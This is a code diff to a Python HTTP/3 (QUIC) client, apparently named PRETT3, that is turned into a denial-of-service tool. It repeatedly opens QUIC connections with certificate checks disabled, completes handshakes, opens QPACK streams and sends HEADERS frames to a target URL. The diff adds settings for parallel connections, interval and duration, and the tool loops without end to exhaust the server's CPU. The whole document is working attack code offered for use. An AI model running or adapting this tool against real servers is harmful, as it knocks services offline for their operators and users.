@@ -11,11 +11,9 @@ from datetime import datetime
 from collections import deque
 from urllib.parse import urlparse
 
-import pyshark
-import asyncio
 import aioquic
 from aioquic.buffer import Buffer
-from aioquic.h3.connection import H3_ALPN, H3Connection, FrameType, encode_frame, encode_settings
+from aioquic.h3.connection import H3_ALPN, H3Connection, StreamType, FrameType, encode_frame, encode_settings
 from aioquic.h3.events import DataReceived, HeadersReceived, H3Event, PushPromiseReceived
 from aioquic.quic.configuration import QuicConfiguration
 from aioquic.quic.events import QuicEvent
@@ -28,27 +26,30 @@ from aioquic.tls import CipherSuite, Epoch
 import aioquic.tls as tls
 from aioquic.quic.connection import *
 import concurrent.futures
+import traceback
+from tqdm import tqdm
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
 sock.settimeout(0.1)
 
 class HttpClient():
-    def __init__(self, quic_conf: QuicConfiguration, hostname: str) -> None:
+    def __init__(self, hostname: str) -> None:
         
-        self.quic_conf = quic_conf
+        self.quic_conf = QuicConfiguration(
+            is_client=True,
+            alpn_protocols=H3_ALPN,
+            original_version=1,
+            verify_mode=ssl.CERT_NONE,
+            server_name=hostname, # OLS requires. normally set in async module's connect()
+            #quic_logger=QuicFileLogger('quic_log'),
+            #secrets_log_file=open('secrets.keylog', "a")
+        )
+        
         self.quic_conf.original_version = 1
         self.hostname = hostname
-        self.quic_conf.server_name = hostname # OLS requires. normally set in async module's connect()
         self.network_path = QuicNetworkPath(hostname)
         self._quic = QuicConnection(configuration=self.quic_conf)
         self._http = H3Connection(self._quic)
-    
-    def build_h3_headers_frame(self, h3_layer):
-        """
-        Builds and returns a HEADERS frame for the H3 layer
-        """
-        headers_data = bytes.fromhex(h3_layer.payload.raw_value)
-        return aioquic.h3.connection.encode_frame(FrameType.HEADERS, headers_data)
 
     def send_quic_stream(self, frame_data, stream_id):
         """
@@ -76,7 +77,7 @@ class HttpClient():
         Craft a sample HEADERS frame
         """
         
-        print("\nCrafting a sample HEADERS frame")
+        #print("\nCrafting a sample HEADERS frame")
         stream_id = self._quic.get_next_available_stream_id()
 
         headers = [
@@ -84,11 +85,7 @@ class HttpClient():
                 (b":scheme", "HTTPS".encode()),
                 (b":authority", self.hostname.encode()),
                 (b":path", "/600k.html".encode()),
-                (b"user-agent", "PRETT3 client".encode()),
-                (b"method", "HEAD".encode()),
-                (b"method", "POST".encode()),
-                (b"method", "GET".encode()),
-                (b"settings", "0".encode()),
+                (b"user-agent", "PRETT3 client".encode())
             ]
 
         frame_data =  self._http._encode_headers(stream_id, headers)
@@ -174,7 +171,7 @@ class HttpClient():
         datagrams, packets = builder.flush()
 
         for data in datagrams:
-            print("Sending message: len={}".format( len(data) ))
+            #print("Sending message: len={}".format( len(data) ))
             sock.sendto(data, (self.hostname, 443))
     
     # we need to implement this method to be able to play with transport params
@@ -654,7 +651,7 @@ class HttpClient():
 
         crypto_pair = self._quic._cryptos[epoch]
         if not crypto_pair.send.is_valid():
-            print("The Encoding crypto is not valid to send data")
+            #print("The Encoding crypto is not valid to send data")
             return
         
         builder = self.get_builder(epoch)
@@ -719,8 +716,6 @@ class HttpClient():
             - creates QuicStreamFrame
         """
         
-        print(">>> open_qpack_streams: start")
-
         settings={
             aioquic.h3.connection.Setting.QPACK_MAX_TABLE_CAPACITY: self._http._max_table_capacity,
             aioquic.h3.connection.Setting.QPACK_BLOCKED_STREAMS: self._http._blocked_streams,
@@ -794,53 +789,82 @@ class HttpClient():
         try:
             while True:
                 data, addr = sock.recvfrom(2048) # 1024 causes problems
-                print("Received message: len={}".format(len(data)))
+                #print("Received message: len={}".format(len(data)))
                 self.receive_datagram(data, now=time.process_time())
         except socket.timeout: pass
 
 
-"""
-We can achieve a successful attack even without those extra headers and body.
-"""
-def main(
-    configuration: QuicConfiguration,
-    url: str
-) -> None:
-    
-    
-    
-    def background_task():
-        
+def execute_attack(url: str, once: bool):
+    try:
         # Step 1: Initialize the HTTP/3 client with QUIC configuration
-        h3client = HttpClient(configuration, urlparse(url).netloc)
-        '''
-        A new h3client object should be created for each task. 
-        If we use the same object for all, it will not increase CPU.
-        One reason might be that differnt h3clients have different connection IDs
-        '''
+        h3client = HttpClient( urlparse(url).netloc)
 
         # Step 2: Establish the initial connection (handshake)
-        print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
+        if once or True: print("\033[93m\n[Establishing connection via Crypto message...]\033[0m")
         h3client.connect()
         h3client.read_from_buffer()  # Receive any response from the server
-
+        
         # Step 3: Complete the connection (finish handshake)
-        print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
+        if once: print("\033[93m\n[Finishing handshake using Handshake message...]\033[0m")
         h3client.complete_connection()
         h3client.read_from_buffer()  # Receive any response from the server
+        
+        if once: print("\033[93m\n[Opening Control Stream...]\033[0m")
+        h3client.open_qpack_streams()
+        h3client.read_from_buffer()
 
+        if once: print("\033[93m\n[Sending HEADERS frame...]\033[0m")
         headers_data = h3client.craft_sample_headers_frame()
         h3client.send_quic_stream(headers_data)
         h3client.read_from_buffer()
+    except Exception as e:
+        if once: print(traceback.format_exc())
+        else: pass #print(str(e))
 
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        futures = []
-        while True:
-            for i in range(10):
-                # Submit each iteration as a separate task
-                futures.append(executor.submit(background_task))
-            time.sleep(1)
 
+def main(
+    url: str,
+    once: bool,
+    attack_params: Dict,
+) -> None:
+
+    if once:
+        attack_start_time = time.time()
+        attack_start_time_pretty = datetime.fromtimestamp(attack_start_time).strftime('%Y-%m-%d %H:%M:%S')
+        print("\n\033[31mNew Attack Starts at {}\033[0m".format(attack_start_time_pretty))
+        execute_attack(url, once)
+        sys.exit()
+
+
+    def run_attack():
+        par_req = attack_params['parallel_requests']
+        duration = attack_params['duration']
+        interval = attack_params['interval']
+
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            futures = []
+            print("\033[31mStart running the attack for {} seconds with {} parallel connections and {} sec interval\033[0m".format(duration, par_req, interval))
+            #while time.time() - attack_start_time < 61:            
+            for i in tqdm( range(0, int(duration/interval)), colour='red' ):
+                for i in range(par_req):
+                    # Submit each iteration as a separate task
+                    futures.append(executor.submit(execute_attack, url, once))
+                time.sleep(interval)
+
+
+    while True: # new attack parameters at every iteration
+        attack_start_time = time.time()
+        attack_start_time_pretty = datetime.fromtimestamp(attack_start_time).strftime('%Y-%m-%d %H:%M:%S')
+        print("\n\033[31mNew Attack Starts at {}\033[0m".format(attack_start_time_pretty))
+        
+        run_attack()
+        attack_end_time = time.time()
+        attack_end_time_pretty = datetime.fromtimestamp(attack_end_time).strftime('%Y-%m-%d %H:%M:%S')
+        print("\033[31mAttack Completes at {}\033[0m".format(attack_end_time_pretty))
+        
+        
+
+    
 
 if __name__ == "__main__":
     defaults = QuicConfiguration(is_client=True)
@@ -849,94 +873,49 @@ if __name__ == "__main__":
     parser.add_argument(
         "url", type=str, help="the URL to query (must be HTTPS)"
     )
+
     parser.add_argument(
-        "--ca-certs", type=str, help="load CA certificates from the specified file"
+        "--once", action="store_true", help="Execute the attack once (for testing purposes)"
     )
     parser.add_argument(
-        "--cipher-suites",
+        "--config",
         type=str,
-        help=(
-            "only advertise the given cipher suites, e.g. `AES_256_GCM_SHA384,"
-            "CHACHA20_POLY1305_SHA256`"
-        ),
+        help="json file that contains parameters of past fuzzing to replicate"
     )
     parser.add_argument(
-        "--congestion-control-algorithm",
-        type=str,
-        default="reno",
-        help="use the specified congestion control algorithm",
-    )
-    parser.add_argument(
-        "--max-data",
+        "-p",
+        "--parallel-requests",
         type=int,
-        help="connection-wide flow control limit (default: %d)" % defaults.max_data,
+        default=20,
+        help="The number of requests to send in parallel (default 20)"
     )
     parser.add_argument(
-        "--max-stream-data",
+        "-i",
+        "--interval",
         type=int,
-        help="per-stream flow control limit (default: %d)" % defaults.max_stream_data,
+        default=1,
+        help="Time to wait before sending the next parallel requests (in sec.) (default 1)"
     )
     parser.add_argument(
-        "-q",
-        "--quic-log",
-        type=str,
-        help="log QUIC events to QLOG files in the specified directory",
-    )
-    parser.add_argument(
-        "-l",
-        "--secrets-log",
-        type=str,
-        help="log secrets to a file, for use with Wireshark",
-    )
-    parser.add_argument(
-        "-v", "--verbose", action="store_true", help="increase logging verbosity"
-    )
-    parser.add_argument(
-        "--local-port",
+        "-d",
+        "--duration",
         type=int,
-        default=0,
-        help="local port to bind for connections",
-    )
-    parser.add_argument(
-        "--max-datagram-size",
-        type=int,
-        default=defaults.max_datagram_size,
-        help="maximum datagram size to send, excluding UDP or IP overhead",
-    )
-    parser.add_argument(
-        "--zero-rtt", action="store_true", help="try to send requests using 0-RTT"
+        default=60,
+        help="The length of attack (in sec.) (default 60)"
     )
 
     args = parser.parse_args()
 
-    # prepare configuration
-    configuration = QuicConfiguration(
-        is_client=True,
-        alpn_protocols=H3_ALPN,
-        congestion_control_algorithm=args.congestion_control_algorithm,
-        max_datagram_size=args.max_datagram_size,
-        original_version=1
-    )
-    if args.ca_certs:
-        configuration.load_verify_locations(args.ca_certs)
-    if args.cipher_suites:
-        configuration.cipher_suites = [
-            CipherSuite[s] for s in args.cipher_suites.split(",")
-        ]
-    configuration.verify_mode = ssl.CERT_NONE
-    if args.max_data:
-        configuration.max_data = args.max_data
-    if args.max_stream_data:
-        configuration.max_stream_data = args.max_stream_data
-    if args.quic_log:
-        configuration.quic_logger = QuicFileLogger(args.quic_log)
-    if args.secrets_log:
-        configuration.secrets_log_file = open(args.secrets_log, "a")
-
+    attack_params = {
+        "parallel_requests": args.parallel_requests,
+        "interval": args.interval,
+        "duration": args.duration
+    }
     
     main(
-            configuration=configuration,
-            url=args.url
+            url=args.url,
+            once=args.once,
+            attack_params=attack_params
         )
     
     
